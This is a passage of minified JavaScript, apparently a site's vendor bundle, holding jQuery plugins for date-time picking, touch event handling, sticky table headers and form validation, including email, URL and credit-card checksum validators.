options=$.extend({},{minInterval:0,maxInterval:0,start:{},end:{}},options),$.fn[method].call(startTime,$.extend({onClose:function(dateText,inst){checkDates($(this),endTime)},onSelect:function(selectedDateTime){selected($(this),endTime,"minDate")}},options,options.start)),$.fn[method].call(endTime,$.extend({onClose:function(dateText,inst){checkDates($(this),startTime)},onSelect:function(selectedDateTime){selected($(this),startTime,"maxDate")}},options,options.end)),checkDates(startTime,endTime),selected(startTime,endTime,"minDate"),selected(endTime,startTime,"maxDate"),$([startTime.get(0),endTime.get(0)])},$.timepicker.log=function(err){window.console&&window.console.log(err)},$.timepicker._util={_extendRemove:extendRemove,_isEmptyObject:isEmptyObject,_convert24to12:convert24to12,_detectSupport:detectSupport,_selectLocalTimezone:selectLocalTimezone,_computeEffectiveSetting:computeEffectiveSetting,_splitDateTime:splitDateTime,_parseDateTimeInternal:parseDateTimeInternal},Date.prototype.getMicroseconds||(Date.prototype.microseconds=0,Date.prototype.getMicroseconds=function(){return this.microseconds},Date.prototype.setMicroseconds=function(m){return this.setMilliseconds(this.getMilliseconds()+Math.floor(m/1e3)),this.microseconds=m%1e3,this}),$.timepicker.version="1.4.1"}}(jQuery),function(a){function f(a,b){if(!(a.originalEvent.touches.length>1)){a.preventDefault();var c=a.originalEvent.changedTouches[0],d=document.createEvent("MouseEvents");d.initMouseEvent(b,!0,!0,window,1,c.screenX,c.screenY,c.clientX,c.clientY,!1,!1,!1,!1,0,null),a.target.dispatchEvent(d)}}if(a.support.touch="ontouchend"in document,a.support.touch){var e,b=a.ui.mouse.prototype,c=b._mouseInit,d=b._mouseDestroy;b._touchStart=function(a){!e&&this._mouseCapture(a.originalEvent.changedTouches[0])&&(e=!0,this._touchMoved=!1,f(a,"mouseover"),f(a,"mousemove"),f(a,"mousedown"))},b._touchMove=function(a){e&&(this._touchMoved=!0,f(a,"mousemove"))},b._touchEnd=function(a){e&&(f(a,"mouseup"),f(a,"mouseout"),this._touchMoved||f(a,"click"),e=!1)},b._mouseInit=function(){var b=this;b.element.bind({touchstart:a.proxy(b,"_touchStart"),touchmove:a.proxy(b,"_touchMove"),touchend:a.proxy(b,"_touchEnd")}),c.call(b)},b._mouseDestroy=function(){var b=this;b.element.unbind({touchstart:a.proxy(b,"_touchStart"),touchmove:a.proxy(b,"_touchMove"),touchend:a.proxy(b,"_touchEnd")}),d.call(b)}}}(jQuery),function($){$.fn.serializeObject=function(){var result={};return $.each(this.serializeArray(),(function(i,element){var node=result[element.name];null!=node?$.isArray(node)?node.push(element.value):result[element.name]=[node,element.value]:result[element.name]=element.value})),result}}(jQuery),function($,window,undefined){var name="stickyTableHeaders",id=0,defaults={fixedOffset:0,leftOffset:0,marginTop:0,objDocument:document,objHead:"head",objWindow:window,scrollableArea:window};function Plugin(el,options){var base=this;base.$el=$(el),base.el=el,base.id=id++,base.$el.bind("destroyed",$.proxy(base.teardown,base)),base.$clonedHeader=null,base.$originalHeader=null,base.isSticky=!1,base.hasBeenSticky=!1,base.leftOffset=null,base.topOffset=null,base.init=function(){base.setOptions(options),base.$el.each((function(){var $this=$(this);$this.css("padding",0),base.$originalHeader=$("thead:first",this),base.$clonedHeader=base.$originalHeader.clone(),$this.trigger("clonedHeader."+name,[base.$clonedHeader]),base.$clonedHeader.addClass("tableFloatingHeader"),base.$clonedHeader.css("display","none"),base.$originalHeader.addClass("tableFloatingHeaderOriginal"),base.$originalHeader.after(base.$clonedHeader)})),base.updateWidth(),base.toggleHeaders(),base.bind()},base.destroy=function(){base.$el.unbind("destroyed",base.teardown),base.teardown()},base.teardown=function(){base.isSticky&&base.$originalHeader.css("position","static"),$.removeData(base.el,"plugin_"+name),base.unbind(),base.$clonedHeader.remove(),base.$originalHeader.removeClass("tableFloatingHeaderOriginal"),base.$originalHeader.css("visibility","visible"),base.el=null,base.$el=null},base.bind=function(){base.$scrollableArea.on("scroll."+name,base.toggleHeaders),base.isWindowScrolling||(base.$window.on("scroll."+name+base.id,base.setPositionValues),base.$window.on("resize."+name+base.id,base.toggleHeaders)),base.$scrollableArea.on("resize."+name,base.toggleHeaders),base.$scrollableArea.on("resize."+name,base.updateWidth)},base.unbind=function(){base.$scrollableArea.off("."+name,base.toggleHeaders),base.isWindowScrolling||(base.$window.off("."+name+base.id,base.setPositionValues),base.$window.off("."+name+base.id,base.toggleHeaders)),base.$scrollableArea.off("."+name,base.updateWidth)},base.toggleHeaders=function(){base.$el&&base.$el.each((function(){var newLeft,$this=$(this),newTopOffset=base.isWindowScrolling?isNaN(base.options.fixedOffset)?base.options.fixedOffset.outerHeight():base.options.fixedOffset:base.$scrollableArea.offset().top+(isNaN(base.options.fixedOffset)?0:base.options.fixedOffset),offset=$this.offset(),scrollTop=base.$scrollableArea.scrollTop()+newTopOffset,scrollLeft=base.$scrollableArea.scrollLeft(),scrolledPastTop=base.isWindowScrolling?scrollTop>offset.top:newTopOffset>offset.top,notScrolledPastBottom=(base.isWindowScrolling?scrollTop:0)<offset.top+$this.height()-base.$clonedHeader.height()-(base.isWindowScrolling?0:newTopOffset);scrolledPastTop&&notScrolledPastBottom?(newLeft=offset.left-scrollLeft+base.options.leftOffset,base.$originalHeader.css({position:"fixed",display:"table-header-group","margin-top":base.options.marginTop,left:newLeft,"z-index":3}),base.leftOffset=newLeft,base.topOffset=newTopOffset,base.$clonedHeader.css("display",""),base.isSticky||(base.isSticky=!0,base.updateWidth(),$this.trigger("enabledStickiness."+name),base.$originalHeader.css("bottom","auto"),base.$originalHeader.css("display","table-header-group")),base.setPositionValues()):base.isSticky&&(base.isSticky=!1,base.resetWidth($("td,th",base.$clonedHeader),$("td,th",base.$originalHeader)),$this.trigger("disabledStickiness."+name)),notScrolledPastBottom||(base.$originalHeader.css("display","table-header-group"),base.$originalHeader.css("position","absolute"),base.$originalHeader.css("top","auto"),base.$originalHeader.css("bottom","0"),base.$originalHeader.css("left","0")),scrolledPastTop||(base.$originalHeader.css("display","none"),base.$clonedHeader.css("display",""))}))},base.setPositionValues=function(){var winScrollTop=base.$window.scrollTop(),winScrollLeft=base.$window.scrollLeft();!base.isSticky||winScrollTop<0||winScrollTop+base.$window.height()>base.$document.height()||winScrollLeft<0||winScrollLeft+base.$window.width()>base.$document.width()||base.$originalHeader.css({top:base.topOffset-(base.isWindowScrolling?0:winScrollTop),left:base.leftOffset-(base.isWindowScrolling?0:winScrollLeft)})},base.updateWidth=function(){if(base.isSticky){base.$originalHeaderCells||(base.$originalHeaderCells=$("th,td",base.$originalHeader)),base.$clonedHeaderCells||(base.$clonedHeaderCells=$("th,td",base.$clonedHeader));var cellWidths=base.getWidth(base.$clonedHeaderCells);base.setWidth(cellWidths,base.$clonedHeaderCells,base.$originalHeaderCells),base.$originalHeader.css("width",base.$clonedHeader.width())}},base.getWidth=function($clonedHeaders){var widths=[];return $clonedHeaders.each((function(index){var width,$this=$(this);if("border-box"===$this.css("box-sizing")){var boundingClientRect=$this[0].getBoundingClientRect();width=boundingClientRect.width?boundingClientRect.width:boundingClientRect.right-boundingClientRect.left}else{if("collapse"===$("th",base.$originalHeader).css("border-collapse"))if(window.getComputedStyle)width=parseFloat(window.getComputedStyle(this,null).width);else{var leftPadding=parseFloat($this.css("padding-left")),rightPadding=parseFloat($this.css("padding-right")),border=parseFloat($this.css("border-width"));width=$this.outerWidth()-leftPadding-rightPadding-border}else width=$this.width()}widths[index]=width})),widths},base.setWidth=function(widths,$clonedHeaders,$origHeaders){$clonedHeaders.each((function(index){var width=widths[index];$origHeaders.eq(index).css({"min-width":width,"max-width":width})}))},base.resetWidth=function($clonedHeaders,$origHeaders){$clonedHeaders.each((function(index){var $this=$(this);$origHeaders.eq(index).css({"min-width":$this.css("min-width"),"max-width":$this.css("max-width")})}))},base.setOptions=function(options){base.options=$.extend({},defaults,options),base.$window=$(base.options.objWindow),base.$head=$(base.options.objHead),base.$document=$(base.options.objDocument),base.$scrollableArea=$(base.options.scrollableArea),base.isWindowScrolling=base.$scrollableArea[0]===base.$window[0]},base.updateOptions=function(options){base.setOptions(options),base.unbind(),base.bind(),base.updateWidth(),base.toggleHeaders()},base.init()}$.fn[name]=function(options){return this.each((function(){var instance=$.data(this,"plugin_"+name);instance?"string"==typeof options?instance[options].apply(instance):instance.updateOptions(options):"destroy"!==options&&$.data(this,"plugin_"+name,new Plugin(this,options))}))}}(jQuery,window),function($){$.extend($.fn,{validate:function(options){if(this.length){var validator=$.data(this[0],"validator");return validator||(this.attr("novalidate","novalidate"),validator=new $.validator(options,this[0]),$.data(this[0],"validator",validator),validator.settings.onsubmit&&(this.validateDelegate(":submit","click",(function(event){validator.settings.submitHandler&&(validator.submitButton=event.target),$(event.target).hasClass("cancel")&&(validator.cancelSubmit=!0),void 0!==$(event.target).attr("formnovalidate")&&(validator.cancelSubmit=!0)})),this.submit((function(event){function handle(){var hidden;return!validator.settings.submitHandler||(validator.submitButton&&(hidden=$("<input type='hidden'/>").attr("name",validator.submitButton.name).val($(validator.submitButton).val()).appendTo(validator.currentForm)),validator.settings.submitHandler.call(validator,validator.currentForm,event),validator.submitButton&&hidden.remove(),!1)}return validator.settings.debug&&event.preventDefault(),validator.cancelSubmit?(validator.cancelSubmit=!1,handle()):validator.form()?validator.pendingRequest?(validator.formSubmitted=!0,!1):handle():(validator.focusInvalid(),!1)}))),validator)}options&&options.debug&&window.console&&console.warn("Nothing selected, can't validate, returning nothing.")},valid:function(){if($(this[0]).is("form"))return this.validate().form();var valid=!0,validator=$(this[0].form).validate();return this.each((function(){valid=valid&&validator.element(this)})),valid},removeAttrs:function(attributes){var result={},$element=this;return $.each(attributes.split(/\s/),(function(index,value){result[value]=$element.attr(value),$element.removeAttr(value)})),result},rules:function(command,argument){var element=this[0];if(command){var settings=$.data(element.form,"validator").settings,staticRules=settings.rules,existingRules=$.validator.staticRules(element);switch(command){case"add":$.extend(existingRules,$.validator.normalizeRule(argument)),delete existingRules.messages,staticRules[element.name]=existingRules,argument.messages&&(settings.messages[element.name]=$.extend(settings.messages[element.name],argument.messages));break;case"remove":if(!argument)return delete staticRules[element.name],existingRules;var filtered={};return $.each(argument.split(/\s/),(function(index,method){filtered[method]=existingRules[method],delete existingRules[method]})),filtered}}var data=$.validator.normalizeRules($.extend({},$.validator.classRules(element),$.validator.attributeRules(element),$.validator.dataRules(element),$.validator.staticRules(element)),element);if(data.required){var param=data.required;delete data.required,data=$.extend({required:param},data)}return data}}),$.extend($.expr[":"],{blank:function(a){return!$.trim(""+$(a).val())},filled:function(a){return!!$.trim(""+$(a).val())},unchecked:function(a){return!$(a).prop("checked")}}),$.validator=function(options,form){this.settings=$.extend(!0,{},$.validator.defaults,options),this.currentForm=form,this.init()},$.validator.format=function(source,params){return 1===arguments.length?function(){var args=$.makeArray(arguments);return args.unshift(source),$.validator.format.apply(this,args)}:(arguments.length>2&&params.constructor!==Array&&(params=$.makeArray(arguments).slice(1)),params.constructor!==Array&&(params=[params]),$.each(params,(function(i,n){source=source.replace(new RegExp("\\{"+i+"\\}","g"),(function(){return n}))})),source)},$.extend($.validator,{defaults:{messages:{},groups:{},rules:{},errorClass:"error",validClass:"valid",errorElement:"label",focusInvalid:!0,errorContainer:$([]),errorLabelContainer:$([]),onsubmit:!0,ignore:":hidden",ignoreTitle:!1,onfocusin:function(element,event){this.lastActive=element,this.settings.focusCleanup&&!this.blockFocusCleanup&&(this.settings.unhighlight&&this.settings.unhighlight.call(this,element,this.settings.errorClass,this.settings.validClass),this.addWrapper(this.errorsFor(element)).hide())},onfocusout:function(element,event){this.checkable(element)||!(element.name in this.submitted)&&this.optional(element)||this.element(element)},onkeyup:function(element,event){9===event.which&&""===this.elementValue(element)||(element.name in this.submitted||element===this.lastElement)&&this.element(element)},onclick:function(element,event){element.name in this.submitted?this.element(element):element.parentNode.name in this.submitted&&this.element(element.parentNode)},highlight:function(element,errorClass,validClass){"radio"===element.type?this.findByName(element.name).addClass(errorClass).removeClass(validClass):$(element).addClass(errorClass).removeClass(validClass)},unhighlight:function(element,errorClass,validClass){"radio"===element.type?this.findByName(element.name).removeClass(errorClass).addClass(validClass):$(element).removeClass(errorClass).addClass(validClass)}},setDefaults:function(settings){$.extend($.validator.defaults,settings)},messages:{required:"This field is required.",remote:"Please fix this field.",email:"Please enter a valid email address.",url:"Please enter a valid URL.",date:"Please enter a valid date.",dateISO:"Please enter a valid date (ISO).",number:"Please enter a valid number.",digits:"Please enter only digits.",creditcard:"Please enter a valid credit card number.",equalTo:"Please enter the same value again.",maxlength:$.validator.format("Please enter no more than {0} characters."),minlength:$.validator.format("Please enter at least {0} characters."),rangelength:$.validator.format("Please enter a value between {0} and {1} characters long."),range:$.validator.format("Please enter a value between {0} and {1}."),max:$.validator.format("Please enter a value less than or equal to {0}."),min:$.validator.format("Please enter a value greater than or equal to {0}.")},autoCreateRanges:!1,prototype:{init:function(){this.labelContainer=$(this.settings.errorLabelContainer),this.errorContext=this.labelContainer.length&&this.labelContainer||$(this.currentForm),this.containers=$(this.settings.errorContainer).add(this.settings.errorLabelContainer),this.submitted={},this.valueCache={},this.pendingRequest=0,this.pending={},this.invalid={},this.reset();var groups=this.groups={};$.each(this.settings.groups,(function(key,value){"string"==typeof value&&(value=value.split(/\s/)),$.each(value,(function(index,name){groups[name]=key}))}));var rules=this.settings.rules;function delegate(event){var validator=$.data(this[0].form,"validator"),eventType="on"+event.type.replace(/^validate/,"");validator.settings[eventType]&&validator.settings[eventType].call(validator,this[0],event)}$.each(rules,(function(key,value){rules[key]=$.validator.normalizeRule(value)})),$(this.currentForm).validateDelegate(":text, [type='password'], [type='file'], select, textarea, [type='number'], [type='search'] ,[type='tel'], [type='url'], [type='email'], [type='datetime'], [type='date'], [type='month'], [type='week'], [type='time'], [type='datetime-local'], [type='range'], [type='color'] ","focusin focusout keyup",delegate).validateDelegate("[type='radio'], [type='checkbox'], select, option","click",delegate),this.settings.invalidHandler&&$(this.currentForm).bind("invalid-form.validate",this.settings.invalidHandler)},form:function(){return this.checkForm(),$.extend(this.submitted,this.errorMap),this.invalid=$.extend({},this.errorMap),this.valid()||$(this.currentForm).triggerHandler("invalid-form",[this]),this.showErrors(),this.valid()},checkForm:function(){this.prepareForm();for(var i=0,elements=this.currentElements=this.elements();elements[i];i++)this.check(elements[i]);return this.valid()},element:function(element){element=this.validationTargetFor(this.clean(element)),this.lastElement=element,this.prepareElement(element),this.currentElements=$(element);var result=!1!==this.check(element);return result?delete this.invalid[element.name]:this.invalid[element.name]=!0,this.numberOfInvalids()||(this.toHide=this.toHide.add(this.containers)),this.showErrors(),result},showErrors:function(errors){if(errors){for(var name in $.extend(this.errorMap,errors),this.errorList=[],errors)this.errorList.push({message:errors[name],element:this.findByName(name)[0]});this.successList=$.grep(this.successList,(function(element){return!(element.name in errors)}))}this.settings.showErrors?this.settings.showErrors.call(this,this.errorMap,this.errorList):this.defaultShowErrors()},resetForm:function(){$.fn.resetForm&&$(this.currentForm).resetForm(),this.submitted={},this.lastElement=null,this.prepareForm(),this.hideErrors(),this.elements().removeClass(this.settings.errorClass).removeData("previousValue")},numberOfInvalids:function(){return this.objectLength(this.invalid)},objectLength:function(obj){var count=0;for(var i in obj)count++;return count},hideErrors:function(){this.addWrapper(this.toHide).hide()},valid:function(){return 0===this.size()},size:function(){return this.errorList.length},focusInvalid:function(){if(this.settings.focusInvalid)try{$(this.findLastActive()||this.errorList.length&&this.errorList[0].element||[]).filter(":visible").focus().trigger("focusin")}catch(e){}},findLastActive:function(){var lastActive=this.lastActive;return lastActive&&1===$.grep(this.errorList,(function(n){return n.element.name===lastActive.name})).length&&lastActive},elements:function(){var validator=this,rulesCache={};return $(this.currentForm).find("input, select, textarea").not(":submit, :reset, :image, [disabled]").not(this.settings.ignore).filter((function(){return!this.name&&validator.settings.debug&&window.console&&console.error("%o has no name assigned",this),this.name in rulesCache||!validator.objectLength($(this).rules())?(this.name in rulesCache&&!Swedbank.isProduction&&console.warn("%o is already cached",this),!1):(rulesCache[this.name]=!0,!0)}))},clean:function(selector){return $(selector)[0]},errors:function(){var errorClass=this.settings.errorClass.replace(" ",".");return $(this.settings.errorElement+"."+errorClass,this.errorContext)},reset:function(){this.successList=[],this.errorList=[],this.errorMap={},this.toShow=$([]),this.toHide=$([]),this.currentElements=$([])},prepareForm:function(){this.reset(),this.toHide=this.errors().add(this.containers)},prepareElement:function(element){this.reset(),this.toHide=this.errorsFor(element)},elementValue:function(element){var type=$(element).attr("type"),val=$(element).val();return"radio"===type||"checkbox"===type?$("input[name='"+$(element).attr("name")+"']:checked").val():"string"==typeof val?val.replace(/\r/g,""):val},check:function(element){element=this.validationTargetFor(this.clean(element));var result,rules=$(element).rules(),dependencyMismatch=!1,val=this.elementValue(element);for(var method in rules){var rule={method:method,parameters:rules[method]};try{if("dependency-mismatch"===(result=$.validator.methods[method].call(this,val,element,rule.parameters))){dependencyMismatch=!0;continue}if(dependencyMismatch=!1,"pending"===result)return void(this.toHide=this.toHide.not(this.errorsFor(element)));if(!result)return this.formatAndAdd(element,rule),!1}catch(e){throw this.settings.debug&&window.console&&console.log("Exception occurred when checking element "+element.id+", check the '"+rule.method+"' method.",e),e}}if(!dependencyMismatch)return this.objectLength(rules)&&this.successList.push(element),!0},customDataMessage:function(element,method){return $(element).data("msg-"+method.toLowerCase())||element.attributes&&$(element).attr("data-msg-"+method.toLowerCase())},customMessage:function(name,method){var m=this.settings.messages[name];return m&&(m.constructor===String?m:m[method])},findDefined:function(){for(var i=0;i<arguments.length;i++)if(void 0!==arguments[i])return arguments[i]},defaultMessage:function(element,method){return this.findDefined(this.customMessage(element.name,method),this.customDataMessage(element,method),!this.settings.ignoreTitle&&element.title||void 0,$.validator.messages[method],"<strong>Warning: No message defined for "+element.name+"</strong>")},formatAndAdd:function(element,rule){var message=this.defaultMessage(element,rule.method),theregex=/\$?\{(\d+)\}/g;"function"==typeof message?message=message.call(this,rule.parameters,element):theregex.test(message)&&(message=$.validator.format(message.replace(theregex,"{$1}"),rule.parameters)),this.errorList.push({message:message,element:element}),this.errorMap[element.name]=message,this.submitted[element.name]=message},addWrapper:function(toToggle){return this.settings.wrapper&&(toToggle=toToggle.add(toToggle.parent(this.settings.wrapper))),toToggle},defaultShowErrors:function(){var i,elements;for(i=0;this.errorList[i];i++){var error=this.errorList[i];this.settings.highlight&&this.settings.highlight.call(this,error.element,this.settings.errorClass,this.settings.validClass),this.showLabel(error.element,error.message)}if(this.errorList.length&&(this.toShow=this.toShow.add(this.containers)),this.settings.success)for(i=0;this.successList[i];i++)this.showLabel(this.successList[i]);if(this.settings.unhighlight)for(i=0,elements=this.validElements();elements[i];i++)this.settings.unhighlight.call(this,elements[i],this.settings.errorClass,this.settings.validClass);this.toHide=this.toHide.not(this.toShow),this.hideErrors(),this.addWrapper(this.toShow).show()},validElements:function(){return this.currentElements.not(this.invalidElements())},invalidElements:function(){return $(this.errorList).map((function(){return this.element}))},showLabel:function(element,message){var label=this.errorsFor(element);label.length?(label.removeClass(this.settings.validClass).addClass(this.settings.errorClass),label.html(message)):(label=$("<"+this.settings.errorElement+">").attr("for",this.idOrName(element)).addClass(this.settings.errorClass).html(message||""),this.settings.wrapper&&(label=label.hide().show().wrap("<"+this.settings.wrapper+"/>").parent()),this.labelContainer.append(label).length||(this.settings.errorPlacement?this.settings.errorPlacement(label,$(element)):label.insertAfter(element))),!message&&this.settings.success&&(label.text(""),"string"==typeof this.settings.success?label.addClass(this.settings.success):this.settings.success(label,element)),this.toShow=this.toShow.add(label)},errorsFor:function(element){var name=this.idOrName(element);return this.errors().filter((function(){return $(this).attr("for")===name}))},idOrName:function(element){return this.groups[element.name]||(this.checkable(element)?element.name:element.id||element.name)},validationTargetFor:function(element){return this.checkable(element)&&(element=this.findByName(element.name).not(this.settings.ignore)[0]),element},checkable:function(element){return/radio|checkbox/i.test(element.type)},findByName:function(name){return $(this.currentForm).find("[name='"+name+"']")},getLength:function(value,element){switch(element.nodeName.toLowerCase()){case"select":return $("option:selected",element).length;case"input":if(this.checkable(element))return this.findByName(element.name).filter(":checked").length}return value.length},depend:function(param,element){return!this.dependTypes[typeof param]||this.dependTypes[typeof param](param,element)},dependTypes:{boolean:function(param,element){return param},string:function(param,element){return!!$(param,element.form).length},function:function(param,element){return param(element)}},optional:function(element){var val=this.elementValue(element);return!$.validator.methods.required.call(this,val,element)&&"dependency-mismatch"},startRequest:function(element){this.pending[element.name]||(this.pendingRequest++,this.pending[element.name]=!0)},stopRequest:function(element,valid){this.pendingRequest--,this.pendingRequest<0&&(this.pendingRequest=0),delete this.pending[element.name],valid&&0===this.pendingRequest&&this.formSubmitted&&this.form()?($(this.currentForm).submit(),this.formSubmitted=!1):!valid&&0===this.pendingRequest&&this.formSubmitted&&($(this.currentForm).triggerHandler("invalid-form",[this]),this.formSubmitted=!1)},previousValue:function(element){return $.data(element,"previousValue")||$.data(element,"previousValue",{old:null,valid:!0,message:this.defaultMessage(element,"remote")})}},classRuleSettings:{required:{required:!0},email:{email:!0},url:{url:!0},date:{date:!0},dateISO:{dateISO:!0},number:{number:!0},digits:{digits:!0},creditcard:{creditcard:!0}},addClassRules:function(className,rules){className.constructor===String?this.classRuleSettings[className]=rules:$.extend(this.classRuleSettings,className)},classRules:function(element){var rules={},classes=$(element).attr("class");return classes&&$.each(classes.split(" "),(function(){this in $.validator.classRuleSettings&&$.extend(rules,$.validator.classRuleSettings[this])})),rules},attributeRules:function(element){var rules={},$element=$(element),type=$element[0].getAttribute("type");for(var method in $.validator.methods){var value;"required"===method?(""===(value=$element.get(0).getAttribute(method))&&(value=!0),value=!!value):value=$element.attr(method),/min|max/.test(method)&&(null===type||/number|range|text/.test(type))&&(value=Number(value)),value?rules[method]=value:type===method&&"range"!==type&&(rules[method]=!0)}return rules.maxlength&&/-1|2147483647|524288/.test(rules.maxlength)&&delete rules.maxlength,rules},dataRules:function(element){var method,value,rules={},$element=$(element);for(method in $.validator.methods)void 0!==(value=$element.data("rule-"+method.toLowerCase()))&&(rules[method]=value);return rules},staticRules:function(element){var rules={},validator=$.data(element.form,"validator");return validator.settings.rules&&(rules=$.validator.normalizeRule(validator.settings.rules[element.name])||{}),rules},normalizeRules:function(rules,element){return $.each(rules,(function(prop,val){if(!1!==val){if(val.param||val.depends){var keepRule=!0;switch(typeof val.depends){case"string":keepRule=!!$(val.depends,element.form).length;break;case"function":keepRule=val.depends.call(element,element)}keepRule?rules[prop]=void 0===val.param||val.param:delete rules[prop]}}else delete rules[prop]})),$.each(rules,(function(rule,parameter){rules[rule]=$.isFunction(parameter)?parameter(element):parameter})),$.each(["minlength","maxlength"],(function(){rules[this]&&(rules[this]=Number(rules[this]))})),$.each(["rangelength","range"],(function(){var parts;rules[this]&&($.isArray(rules[this])?rules[this]=[Number(rules[this][0]),Number(rules[this][1])]:"string"==typeof rules[this]&&(parts=rules[this].split(/[\s,]+/),rules[this]=[Number(parts[0]),Number(parts[1])]))})),$.validator.autoCreateRanges&&(rules.min&&rules.max&&(rules.range=[rules.min,rules.max],delete rules.min,delete rules.max),rules.minlength&&rules.maxlength&&(rules.rangelength=[rules.minlength,rules.maxlength],delete rules.minlength,delete rules.maxlength)),rules},normalizeRule:function(data){if("string"==typeof data){var transformed={};$.each(data.split(/\s/),(function(){transformed[this]=!0})),data=transformed}return data},addMethod:function(name,method,message){$.validator.methods[name]=method,$.validator.messages[name]=void 0!==message?message:$.validator.messages[name],method.length<3&&$.validator.addClassRules(name,$.validator.normalizeRule(name))},methods:{required:function(value,element,param){if(!this.depend(param,element))return"dependency-mismatch";if("select"===element.nodeName.toLowerCase()){var val=$(element).val();return val&&val.length>0}return this.checkable(element)?this.getLength(value,element)>0:$.trim(value).length>0},email:function(value,element){return this.optional(element)||/^((([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*)|((\x22)((((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(([\x01-\x08\x0b\x0c\x0e-\x1f\x7f]|\x21|[\x23-\x5b]|[\x5d-\x7e]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(\\([\x01-\x09\x0b\x0c\x0d-\x7f]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]))))*(((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(\x22)))@((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))$/i.test(value)},url:function(value,element){return this.optional(element)||/^(https?|s?ftp):\/\/(((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:)*@)?(((\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5]))|((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.?)(:\d*)?)(\/((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)+(\/(([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)*)*)?)?(\?((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|[\uE000-\uF8FF]|\/|\?)*)?(#((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|\/|\?)*)?$/i.test(value)},date:function(value,element){return this.optional(element)||!/Invalid|NaN/.test(new Date(value).toString())},dateISO:function(value,element){return this.optional(element)||/^\d{4}[\/\-]\d{1,2}[\/\-]\d{1,2}$/.test(value)},number:function(value,element){return this.optional(element)||/^-?(?:\d+|\d{1,3}(?:,\d{3})+)?(?:\.\d+)?$/.test(value)},digits:function(value,element){return this.optional(element)||/^[1-9]\d*(\.\d+)?$/.test(value)},creditcard:function(value,element){if(this.optional(element))return"dependency-mismatch";if(/[^0-9 \-]+/.test(value))return!1;for(var nCheck=0,nDigit=0,bEven=!1,n=(value=value.replace(/\D/g,"")).length-1;n>=0;n--){var cDigit=value.charAt(n);nDigit=parseInt(cDigit,10),bEven&&(nDigit*=2)>9&&(nDigit-=9),nCheck+=nDigit,bEven=!bEven}return nCheck%10==0},minlength:function(value,element,param){var length=$.isArray(value)?value.length:this.getLength($.trim(value),element);return this.optional(element)||length>=param},maxlength:function(value,element,param){var length=$.isArray(value)?value.length:this.getLength($.trim(value),element);return this.optional(element)||length<=param},rangelength:function(value,element,param){var length=$.isArray(value)?value.length:this.getLength($.trim(value),element);return this.optional(element)||length>=param[0]&&length<=param[1]},min:function(value,element,param){return this.optional(element)||value>=param},max:function(value,element,param){return this.optional(element)||value<=param},range:function(value,element,param){return this.optional(element)||value>=param[0]&&value<=param[1]},equalTo:function(value,element,param){var target=$(param);return this.settings.onfocusout&&target.unbind(".validate-equalTo").bind("blur.validate-equalTo",(function(){$(element).valid()})),value===target.val()},remote:function(value,element,param){if(this.optional(element))return"dependency-mismatch";var previous=this.previousValue(element);if(this.settings.messages[element.name]||(this.settings.messages[element.name]={}),previous.originalMessage=this.settings.messages[element.name].remote,this.settings.messages[element.name].remote=previous.message,param="string"==typeof param&&{url:param}||param,previous.old===value)return previous.valid;previous.old=value;var validator=this;this.startRequest(element);var data={};return data[element.name]=value,$.ajax($.extend(!0,{url:param,mode:"abort",port:"validate"+element.name,dataType:"json",data:data,success:function(response){validator.settings.messages[element.name].remote=previous.originalMessage;var valid=!0===response||"true"===response;if(valid){var submitted=validator.formSubmitted;validator.prepareElement(element),validator.formSubmitted=submitted,validator.successList.push(element),delete 